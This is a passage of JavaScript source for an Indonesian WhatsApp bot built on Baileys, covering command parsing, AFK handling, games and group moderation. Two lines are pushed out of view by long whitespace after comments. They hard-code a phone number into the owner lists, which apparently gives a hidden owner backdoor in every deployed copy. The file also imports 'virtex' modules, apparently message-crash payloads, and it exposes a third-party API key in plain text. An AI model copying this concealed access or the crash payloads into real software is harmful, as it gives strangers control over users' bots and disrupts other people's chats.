const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		WAMessageProto,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
		relayWAMessage,
		device,
		Browsers,
		DataView,
        TypedArray,
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const os = require('os')
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require("brainly-scraper");
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const FormData = require('form-data')
const qrkode = require("qrcode")
const cheerio = require('cheerio')
const ggs = require('google-it')
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const tod = require('tod-api');
const primbon = require('primbon-scraper')
const RA = require('ra-api')
const { removeBackgroundFromImageFile } = require('remove.bg')
const { joox } = require('./lib/scrape_joox')
const Fb = require('fb-video-downloader');
const instareel = require("insta-reel");


// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();



 //******************* LIB FILE ********************\\
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color.js')
const hx = require("./lib/hxz-api")
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { styleText, baseURI, ytsr, yta, ytv, igdl, upload, buffer2Stream, stream2Buffer, noop, ythd, formatDate} = require('./lib/ytdl')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { hentong, sewabot, donasi, help, info1} = require('./message')
const { msgFilter } = require('./lib/antispam')
const { uploadFile1Day, RESTfulAPI, uptotele, uploadimg, uploadFile, uploadImages } = require('./lib/uploadimage')
const { recognize } = require('./lib/ocr')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const textpro = require('./lib/textpro')
const simple = require("./lib/simple.js");
const off = require('./lib/afk.js')
let _off = JSON.parse(fs.readFileSync('./lib/afk.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const WAConnection = simple.WAConnection(_WAConnection)
const client = new WAConnection()
const reminder = require("./lib/reminder");
const { buggc } = require('./lib/antibuggc.js')
const { wikiSearch } = require('./lib/wiki.js')
const _prem = require("./lib/premium");
const _sewa = require('./lib/sewa')
const game = require("./lib/game");
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { bad, menu, tekssalah, katahai, katamalem, katasiang, katasore, katalopyou, teksbanned, tekscmd, teksspam, ilhamberkata, ngebucin, badud, ohayo, salam, thanks} = require("./message/messages.js");
const { mediafireDl } = require('./lib/mediafire')
const { setGelud } = require('./lib/gamegelud.js')
const  { onGoing, dadu, asupan } = require("./lib/otakudesu")
const translate = require('./lib/translate')

//DAYA
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))

//hasil editan sendiri
const { addCommands, checkCommands, deleteCommands } = require('./lib/commands')
const { addSpam, unSpam, SpamExpired, cekSpam} = require("./lib/spammer");
const { addSpammer, unSpammer, SpammerExpired, cekSpammer} = require("./lib/antispammer");
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword.js");
const { addBanned, unBanned, cekBannedUser } = require("./lib/banned");
const { addError, deleteError, checkError } = require("./lib/totalerror");
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("./lib/blockcmd");
const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");
const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, botz, unregister, ucaphai, toxicbro, spamnih, loplop } = require("./message/ninamess");

//SEND
const vcard = 'BEGIN:VCARD\n'  // Gak Usah Di Ganti
            + 'VERSION:3.0\n'  // Gak Usah DiGanti
            + 'FN:𝙄𝙆𝙔 𝘽𝙊𝙏𝙕 :/\n' //ganti nama bot lu
            + 'ORG: 𝙹𝚞𝚜𝚝 𝙱𝚎 𝚂𝚝𝚛𝚘𝚗𝚐 :(\n' //Ganti Jadi Nama Lu
            + 'TEL;type=CELL;type=VOICE;waid=6289699472590:+62 89699472590\n'  //ganti nomor lu! 
            + 'END:VCARD'

angka = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14']
const ikih1 = angka[Math.floor(Math.random() * (angka.length))]
const ikih2 = angka[Math.floor(Math.random() * (angka.length))]

 //******************* VIRTEX FILE ********************\\
//virtex by tsukasa
const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('./virtex/virtex.js')
const { virtex6 } = require('./virtex/virtex6.js')
const { virtex7 } = require('./virtex/virtex7.js')
const { antivirus } = require('./virtex/antivirus.js')
const { webp2mp4File } = require("./lib/webp2mp4");
           

 //******************* JSON FILE ********************\\
const { _scommand, antilink, antivirtex, commandsDB, setiker, audionye, musiknye, imagenye, videonye, bancht, spamkuyy, grupbadword, senbadword, ban, badword } = require("./message/jsonfile");
const { listcmdblock, mute, _reminder, antihidetg, antivo, kickarea, welkom, antibug, settings, listerror, balance, limit, glimit, premium, _claim, sewa, user } = require("./message/jsonfile");
const { blocked,hitnya,spamBan,linkgcnya,antidel } = require("./message/jsonfile");

 //******************* STICKER PACK ********************\\
const { gaboleh, spam1, spam2, istigfar, hanyaadmin, jadiinadmin, ucapsalam, samasama, kumsalam } = require("./message/stickerPack.js");

 //******************* FILE PHOTO ********************\\
const virgam = fs.readFileSync('./stik/virgam.jpeg');
const davizin = fs.readFileSync('./stik/davizinmaker.jpg')
const girl = fs.readFileSync('./stik/trava.jpg');
const thumb = fs.readFileSync('./stik/thumb.jpeg')
const ikyz = fs.readFileSync('./stik/ikyz.jpeg')
const lolic = fs.readFileSync('./stik/video1.jpg')
const dony = fs.readFileSync('./stik/dony.jpeg')
const donh = fs.readFileSync('./stik/donh.jpeg')
const prek = fs.readFileSync('./stik/prem.jpeg')
const saput = fs.readFileSync('./stik/saput.jpeg')
const fakethumbnail = fs.readFileSync('./stik/fake.jpeg')

//********GAME
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))

//ANTI
const antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
const antibatu = JSON.parse(fs.readFileSync('./database/antibatu.json'));

autoreadgc = false
autoreadpc = false
explain = settings.explain
global.Anticall = settings.Anticall
fake1 = settings.copyright
namalu = settings.namalu
publik = settings.publik
namaDocument = settings.namaDocument
ephemeral = false
totalForward = settings.totalForward
prefa = settings.setPrefix.prefix
multi = settings.setPrefix.multi
onepref  = settings.setPrefix.onepref
forwarding = settings.forwarding
nopref = false
offline = false
autoblockcmd = settings.autoblockcmd
autobio = settings.autobio
typing= settings.typing
autoread = settings.autoread
autovn = settings.autovn
targetpc = '0'
nomerOwner = settings.nomerlu
nomerbot = settings.nomerbot
fake = settings.namabot
numbernye = '0'
let tebakgambar = []; 
let family100 = []; 
let mtk = []; 
let tebaklirik = [];  
let siapaaku = [];
let tebakkata = []
let tebakbendera = [];
let tebakhewan = [];
let tebakanime = [];
let caklontong = []
let nsfw = []
let siminya = []
waktu = '-'
alasan = '-'
enter = '\n'
tz = `❏`
listjadibot1 = [];
jeda = false
gamewaktu = settings.gamewaktu
autosticker = settings.autosticker
limitCount = settings.limitCount
sendbug = false
picdetec = true
teksChat = settings.antiPrivateChat.teksChat
chatBot = settings.antiPrivateChat.chatBot
gender = settings.gender

autorespon = settings.autorespon 
copyright = `© ${fake1}`
Loading = settings.Loading 

welcomeType1 = settings.setWelcome.welcomeType1
welcomeType2 = settings.setWelcome.welcomeType2
welcomeType3 = settings.setWelcome.welcomeType3
autoWelcome = settings.setWelcome.autoWelcome



katalog = settings.setMenu.katalogMenu
troli = settings.setMenu.troliMenu
Lokasi = settings.setMenu.lokasiMenu
dokumen = settings.setMenu.documentMenu

bcTroli = true
bcLokasi = false
bcDokumen = false    

setWeb = settings.setReply.setWeb
setTroli = settings.setReply.setTroli
setMessage = settings.setReply.setMessage
setVideo = settings.setReply.setVideo


fakeToko = settings.setQuoted.fakeToko
fakeKontak = settings.setQuoted.fakeKontak
fakeTeks = settings.setQuoted.fakeTeks
fakeTroli = settings.setQuoted.fakeTroli

jumlahTroli = settings.jumlahTroli

const On =`ᴏɴ`
const Off =`ᴏғғ`
const zadani = ["6289699472590-1632578387@g.us","6289699472590-1633160194@g.us"]

zenzkey = "officialdittaz"
apikey = "himaru"
imgbbkey = settings.imgbbApikey
api = "https://myselfff.herokuapp.com/docs"


const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}

const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}

function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}

let d = new Date
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})

function monospace(string) {
return '```' + string + '```'
}   
function jsonformat(string) {
return JSON.stringify(string, null, 2)
}
function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}

function clockString(ms) {
let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
}


/*           Recodenya yang teliti ya sayang                                                                              */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Ownerin ="6289699472590@s.whatsapp.net"
/*           ntar klo error jangan salahin gua                                                               */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ownerNumber = [`6289699472590@s.whatsapp.net`,`${nomerOwner}@s.whatsapp.net`,`${nomerbot}@s.whatsapp.net`]
//=================================================//
module.exports = ikyc = async (ikyc, iky, baterai) => {
	try {
        if (!iky.hasNewMessage) return 
        iky = iky.messages.all()[0]
		if (!iky.message) return                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
		if (iky.key && iky.key.remoteJid == 'status@broadcast') return
		const m = simple.smsg(ikyc, iky);
		const senderr = m.sender.split`@`[0]
		const cot = iky.key.fromMe ? ikyc.user.jid : ikyc.contacts[iky.key.fromMe ? ikyc.user.jid : iky.key.remoteJid.endsWith('@g.us') ? iky.participant : iky.key.remoteJid] || { notify: jid.replace(/@.+/, '') }
        const pushnem = iky.key.fromMe ? ikyc.user.name : cot.notify || cot.vname || cot.name || '-'
        const sent = iky.key.fromMe ? ikyc.user.jid : iky.key.remoteJid.endsWith('@g.us') ? iky.participant : iky.key.remoteJid
		const theOwner = Ownerin.includes(sent)
		const isowner = ownerNumber.includes(sent)		
		const metaData = iky.key.remoteJid.endsWith('@g.us')  ? await ikyc.groupMetadata(iky.key.remoteJid) : ''
		const memberGroup = iky.key.remoteJid.endsWith('@g.us')  ? metaData.participants : ''
		const botAdmins = iky.key.remoteJid.endsWith('@g.us') ? getGroupAdmins(memberGroup) : ''
		const adminGroup = botAdmins.includes(sent) || false
		const isBotAdmins = botAdmins.includes(ikyc.user.jid) || false
		const Antibuggc = iky.key.remoteJid.endsWith('@g.us')  ? antibug.includes(iky.key.remoteJid) : false
		
	     //Antibuggc edited  by official dittaz, thanks to Mbb, Memans and Manik
	    if(Antibuggc && iky.key.remoteJid.endsWith('@g.us')){
	    if(Object.keys(iky.message)[0] === 'ephemeralMessage' && JSON.stringify(iky.message).includes('EPHEMERAL_SETTING') && iky.message.ephemeralMessage.message.protocolMessage.type === 3){ 
		if(adminGroup) return ikyc.sendMessage(iky.key.remoteJid, 'Admin grup mah bebas main buggc yekan 😎🤣', MessageType.text)
	    if(isowner) return ikyc.sendMessage(iky.key.remoteJid, 'Owner mah bebas ngebug yekan 😎🤣', MessageType.text)
        ikyc.sendMessage(iky.key.remoteJid, buggc(senderr,pushnem), MessageType.text)
        if(!isBotAdmins) return 
        await ikyc.groupRemove(iky.key.remoteJid, [sent]);
		}
		}
		   
        iky.message = (Object.keys(iky.message)[0] === 'ephemeralMessage') ? iky.message.ephemeralMessage.message : iky.message        
        me = ikyc.user
        const antibot = m.isBaileys
        const content = JSON.stringify(iky.message)
		const from = iky.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, buttonsMessage, image, video, sticker, document, audio, product } = MessageType
		const type = Object.keys(iky.message)[0]        
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		//const cmd = (type === 'conversation' && iky.message.conversation) ? iky.message.conversation : (type == 'imageMessage') && iky.message.imageMessage.caption ? iky.message.imageMessage.caption : (type == 'videoMessage') && iky.message.videoMessage.caption ? iky.message.videoMessage.caption : (type == 'extendedTextMessage') && iky.message.extendedTextMessage.text ? iky.message.extendedTextMessage.text : (type == <Message') && (getCmd(iky.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(iky.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(iky.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		const cmd = (type === 'conversation' && iky.message.conversation) ? iky.message.conversation : (type == 'imageMessage') && iky.message.imageMessage.caption ? iky.message.imageMessage.caption : (type == 'videoMessage') && iky.message.videoMessage.caption ? iky.message.videoMessage.caption : (type == 'extendedTextMessage') && iky.message.extendedTextMessage.text ? iky.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(iky.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(iky.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(iky.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        var pes = (type === 'conversation' && iky.message.conversation) ? iky.message.conversation : (type == 'imageMessage') && iky.message.imageMessage.caption ? iky.message.imageMessage.caption : (type == 'videoMessage') && iky.message.videoMessage.caption ? iky.message.videoMessage.caption : (type == 'extendedTextMessage') && iky.message.extendedTextMessage.text ? iky.message.extendedTextMessage.text : ''
        const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const messagesC = pes.slice(0).trim()
        
         if (multi){
		 var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
       } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
         }  
        global.prefix        
        const body = (type === 'conversation' && iky.message.conversation.startsWith(prefix)) ? iky.message.conversation : (type == 'imageMessage') && iky.message[type].caption.startsWith(prefix) ? iky.message[type].caption : (type == 'videoMessage') && iky.message[type].caption.startsWith(prefix) ? iky.message[type].caption : (type == 'extendedTextMessage') && iky.message[type].text.startsWith(prefix) ? iky.message[type].text : (type == 'listResponseMessage') && iky.message[type].singleSelectReply.selectedRowId ? iky.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && iky.message[type].selectedButtonId ? iky.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(iky.message[type].fileSha256.toString('base64')) !== null && getCmd(iky.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(iky.message[type].fileSha256.toString('base64')) : ""
        //body = (type === 'listResponseMessage' && iky.message.listResponseMessage.title) ? iky.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && iky.message.buttonsResponseMessage.selectedButtonId) ? iky.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && iky.message.conversation.startsWith(prefix)) ? iky.message.conversation : (type == 'imageMessage') && iky.message.imageMessage.caption.startsWith(prefix) ? iky.message.imageMessage.caption : (type == 'videoMessage') && iky.message.videoMessage.caption.startsWith(prefix) ? iky.message.videoMessage.caption : (type == 'extendedTextMessage') && iky.message.extendedTextMessage.text.startsWith(prefix) ? iky.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(iky.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(iky.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(iky.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budy = (type === 'conversation') ? iky.message.conversation : (type === 'extendedTextMessage') ? iky.message.extendedTextMessage.text : ''
        button = (type == 'buttonsResponseMessage') ? iky.message.buttonsResponseMessage.selectedDisplayText : ''
        listmes = (type == 'listResponseMessage') ? iky.message.listResponseMessage.title : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
		const command1 = body.slice(2).trim().split(/ +/).shift().toLowerCase()			
		//const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
        const c = args.join(" ")
		const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
		const botNumber = ikyc.user.jid
		const botNumberss = ikyc.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = iky.key.fromMe ? ikyc.user.jid : isGroup ? iky.participant : iky.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const isOwner = ownerNumber.includes(sender)
		const isClaimOn = _claim.includes(sender)
		const totalchat = await ikyc.chats.all()
		const groupMetadata = isGroup ? await ikyc.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const conts = iky.key.fromMe ? ikyc.user.jid : ikyc.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = iky.key.fromMe ? ikyc.user.name : conts.notify || conts.vname || conts.name || '-'
        chatss = (type === 'conversation') ? iky.message.conversation : (type === 'extendedTextMessage') ? iky.message.extendedTextMessage.text : ''
        const forward = { forwardingScore: totalForward, isForwarded: forwarding, sendEphemeral: ephemeral}
        const tescuk = ["0@s.whatsapp.net"]
        const isSpammerr = cekSpammer(sender, spamkuyy)
        const isUser = user.includes(sender)
        const isBanned = cekBannedUser(sender, ban)
        const isSpamBan = cekSpam(sender, spamBan)        
        const timestampp = speed();        
	    const latensi = speed() - timestampp
        const arg = budy.slice(command.length + 2, budy.length)
        const atibot = iky.key.isBaileys
        const gcounti = settings.gcount
        const itsMe = iky.key.fromMe                 

//VN saat ada yg maggil bot
const iyakak = botz[Math.floor(Math.random() * botz.length)]              
const ucapbot = fs.readFileSync(iyakak)

//Vn saat command tidak ditemukan
const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
const gakada = fs.readFileSync(unreg)

//BURU
const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐡']
const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
const buruh3 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']                                    
const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]    

//VN saat ada yang bilang halo
const ucapannih = ucaphai[Math.floor(Math.random() * ucaphai.length)]              
const ucapanya = fs.readFileSync(ucapannih)

//VN saat ada yang toxic
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
const astaga = fs.readFileSync(anying)

//VN saat ada yg akses fitur owner
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
const gakmau = fs.readFileSync(ahenggak)

//VN saat ada yg bilang selamat pagi
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)

//VN saat ada yg bilang selamat malam
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)

//VN saat ada yg bilang selamat siang
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)

//VN saat ada yg spam
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)

//VN saat ada yg bilang halo
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)

//VN saat ada yg bilang asalamualaikum
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

//VN saat ada yg bilang i love u
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu)

//cari teman
const teman = user[Math.floor(Math.random() * user.length)]

//Teks untuk pertanyaan game yg salah
const jawabansalah = tekssalah[Math.floor(Math.random() * tekssalah.length)]
           
const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]                         
const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]                         
const textbanned = teksbanned[Math.floor(Math.random() * teksbanned.length)]
 
//Security / Keamanan
const Toxic = isGroup ? grupbadword.includes(from) : false
const isBanchat = isGroup ? bancht.includes(from) : false
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isVote = isGroup ? voting.includes(from) : false
const isAntiLink = isGroup ? antilink.includes(from) : false
const isAntiWame = isGroup ? antiwame.includes(from) : false
const isAntiBatu = isGroup ? antibatu.includes(from) : false
const AntiVirtex = isGroup ? antivirtex.includes(from) : false
const isAntilinkGc = isGroup ? linkgcnya.includes(from) : false      
const isMuted = isGroup ? mute.includes(from) : false
const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
const isAntiviewonce = isGroup ? antivo.includes(from) : false;
const isKickarea = isGroup ? kickarea.includes(from) : false;
const isWelkom = isGroup ? JSON.parse(fs.readFileSync('./database/welkom.json')).includes(from) : false
const isZadani = isGroup ? zadani.includes(from) : false
const isSimi = isGroup ? siminya.includes(from) : false
const isAntidel = isGroup ? antidel.includes(from) : false
const isSewa =  _sewa.checkSewaGroup(from, sewa)
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user
const isNsfw = isGroup ? nsfw.includes(from) : false;
const isAfkOn = off.checkAfkUser(sender, _off)
        const mentionByTag = type == "extendedTextMessage" && iky.message.extendedTextMessage.contextInfo != null ? iky.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && iky.message.extendedTextMessage.contextInfo != null ? iky.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []

//Auto READ   
if(autoread){
 ikyc.chatRead(from, "read")
 }

// Auto Read Group 
if(autoreadgc){
var readgc =  ikyc.chats.array.filter(v => v.jid.endsWith('g.us'))
readgc.map( async ({ jid }) => {
 ikyc.chatRead(jid, "read")
})
}

// Auto Read Private 
if(autoreadpc){
var readpc =  ikyc.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
readpc.map( async ({ jid }) => {
 ikyc.chatRead(jid, "read")
})
}
//LIMIT FUNGSI
var angka = '1'
if (isPremium) {
angka = '0'
} 

//FUNCTION
            cekafk(afk)
            if (!iky.key.remoteJid.endsWith('@g.us') && offline){
            if (!iky.key.fromMe){
            if (isAfk(iky.key.remoteJid)) return
            addafk(iky.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            ikyc.sendMessage(iky.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`stik/bot.jpg`)}}}})
            }
            }   
        if (iky.key.remoteJid.endsWith('@g.us') && offline) {
        if (!iky.key.fromMe){
        if (iky.message.extendedTextMessage != undefined){
        if (iky.message.extendedTextMessage.contextInfo != undefined){
        if (iky.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of iky.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(iky.key.remoteJid)) return
        addafk(iky.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        ikyc.sendMessage(iky.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`stik/bot.jpg`)}}}})
          }
        }
            }
          }
        }
      }
    }
ikyc.on('chat-update', asd => {
if (asd.presences) {
	for (key in asd.presences) {
		if (asd.presences[key].lastKnownPresence == 'composing' || asd.presences[key].lastKnownPresence == 'recording') {
			if (!isGroup) return
			if (off.checkAfkUser(key, _off)) {
               _off.splice(off.getAfkPosition(key, _off), 1)
            fs.writeFileSync('./lib/afk.json', JSON.stringify(_off))
         ckck = `\n*@${key.split('@')[0]}* terdeteksi ${asd.presences[key].lastKnownPresence == 'composing' ? 'sedang mengetik...' : 'sedang merekam...'}\nSekarang dia sudah tidak AFK\n`
     ikyc.sendMessage(asd.jid, ckck.trim(), text, {thumbnail: fs.readFileSync(`./stik/bot.jpg`), sendEphemeral: true, contextInfo:{mentionedJid:ikyc.parseMention(ckck)}})
                }}}}})

        if (isGroup && !iky.key.fromMe) {
                for (let ment of mentionUser) {
                    if (off.checkAfkUser(ment, _off)) {
                        getId = off.getAfkId(ment, _off)
                        getReason = off.getAfkReason(getId, _off)
                        getTime = Date.now() - off.getAfkTime(getId, _off)
                        heheh = ms(getTime)
                        ikyc.sendMessage(from, `Jangan tag, dia sedang afk\n\n*Reason :* ${getReason}\n*Sejak :* ${heheh.hours} jam, ${heheh.minutes} menit, ${heheh.seconds} detik yg lalu\n`,text, {quoted:iky})
                        ikyc.sendMessage(ment, `LAPOR BOS \nAda yang mencari anda saat anda offline\n\nNama : ${pushname}\nNomor : wa.me/${sender.split("@")[0]}\nDi Grup : ${groupName}\nPesan : ${budy}`, text, {contextInfo:{mentionedJid: ikyc.parseMention(budy)}})
                    }
                }
                if (off.checkAfkUser(sender, _off)) {
                	getId = off.getAfkId(sender, _off)
                	getReason = off.getAfkReason(getId, _off)
                    getTime = Date.now() - off.getAfkTime(getId, _off)
                    heheh = ms(getTime)
                    _off.splice(off.getAfkPosition(sender, _off), 1)
                    fs.writeFileSync('./lib/afk.json', JSON.stringify(_off))
